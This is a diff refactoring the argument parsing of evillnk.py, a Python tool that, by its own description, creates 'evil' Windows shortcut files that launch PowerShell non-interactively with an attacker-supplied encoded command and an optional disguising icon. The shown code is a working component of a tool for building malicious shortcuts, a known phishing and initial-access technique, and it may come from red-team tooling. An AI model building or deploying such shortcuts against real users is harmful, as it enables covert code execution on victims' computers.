@@ -75,23 +75,19 @@ def write_lnk(lnk):
 
 def parse_arguments():
     parser = argparse.ArgumentParser(prog='evillnk.py', description='Create an evil lnk that executes PowerShell with arguments')
-    parser.add_argument('lnk_name', action='store', help='Name of the shortcut file')
-    parser.add_argument('-a', '--args', action='store', dest='arguments', help='Arguments to pass to PowerShell. E.g. "-noe -noni -e <encoded command>')
-    parser.add_argument('-i', '--icon', action='store', dest='icon', help='Icon file containing icon for the lnk file')
-    parser.add_argument('-n', '--ii', '--icon_index', action='store', dest='icon_index', help='Index within icon file')
+    parser.add_argument('-n', '--name', required=True, action='store', help='Name of the shortcut file')
+    parser.add_argument('-c', '--command', required=True, action='store', dest='command', help='Encoded command to execute with PowerShell. Will be executed as: powershell -noni -noe -e <command>')
+    parser.add_argument('--icon', action='store', dest='icon', help='Icon file containing icon for the lnk file')
+    parser.add_argument('--index', action='store', type=int, dest='index', help='Index within icon file')
     args = parser.parse_args()
     return args
 
 def main():
-    parser = argparse.ArgumentParser(prog='evillnk.py', description='Create an evil lnk that executes a PowerShell encoded command')
-    parser.add_argument('lnk_name', action='store', help='Name of the shortcut file')
-    parser.add_argument('command', action='store', help='Encoded command to execute with PowerShell')
-    parser.add_argument('-i', '--icon', action='store', dest='icon', help='Icon file containing icon for the lnk file')
-    parser.add_argument('-n', '--ii', '--icon_index', type=int, action='store', dest='icon_index', help='Index within icon file')
-    args = parser.parse_args()
+    
+    args = parse_arguments()
     target = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
     arguments = '-noni -noe -e ' + args.command
-    create_lnk(args.lnk_name, target, arguments, args.icon, args.icon_index)
+    create_lnk(args.name, target, arguments, args.icon, args.index)
 
 
 if __name__ == '__main__':
